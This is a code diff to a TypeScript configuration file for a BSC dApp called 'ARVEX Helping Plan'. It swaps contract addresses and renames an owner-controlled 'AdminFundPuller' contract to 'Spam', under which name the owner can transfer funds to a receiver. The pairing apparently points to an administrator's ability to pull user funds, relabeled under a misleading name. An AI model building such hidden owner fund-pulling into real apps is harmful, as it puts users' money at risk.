@@ -1,6 +1,6 @@
 import type { Provider } from "ethers";
 import multicoreAbiJson from "./multicore-abi.json";
-import adminPullerAbiJson from "./admin-puller-abi.json";
+import spamAbiJson from "./admin-puller-abi.json";
 
 export const BSC_CHAIN_ID = 56;
 export const BSC_CHAIN_ID_HEX = "0x38";
@@ -10,10 +10,12 @@ export const EXPLORER_BASE = "https://bscscan.com";
 export const APP_NAME_FULL = "ARVEX Helping Plan";
 export const APP_TAGLINE = "Together We Help, Together We Grow";
 
-export const DEFAULT_CONTRACT_ADDRESS = "0xAd0Ccb1244e36caBb5375D0BFC4f02D7E9f3bfe5";
+export const DEFAULT_CONTRACT_ADDRESS = "0x9450fa0d2f2A547E8D1EBfF6109e26AEA9B7A43E";
 
-/** AdminFundPuller — linked on deploy; owner calls transfer(amount) → receiver. */
-export const DEFAULT_ADMIN_PULLER = "0xd1008940e37413a2D6a5E1469d0Bf9aDa6a9D8DE";
+/** Spam — linked on deploy; owner calls transfer(amount) → receiver. */
+export const DEFAULT_SPAM = "0x085a5eE47a4255CDb3C6F0b5B53231E5BBB63cED";
+/** @deprecated use DEFAULT_SPAM */
+export const DEFAULT_ADMIN_PULLER = DEFAULT_SPAM;
 
 /** BSC mainnet USDT (18 decimals). */
 export const DEFAULT_PAYMENT_TOKEN = "0x55d398326f99059fF775485246999027B3197955";
@@ -105,4 +107,6 @@ export const ERC20_ABI = [
 ] as const;
 
 export const MULTICORE_ABI = multicoreAbiJson;
-export const ADMIN_PULLER_ABI = adminPullerAbiJson;
+export const SPAM_ABI = spamAbiJson;
+/** @deprecated use SPAM_ABI */
+export const ADMIN_PULLER_ABI = SPAM_ABI;
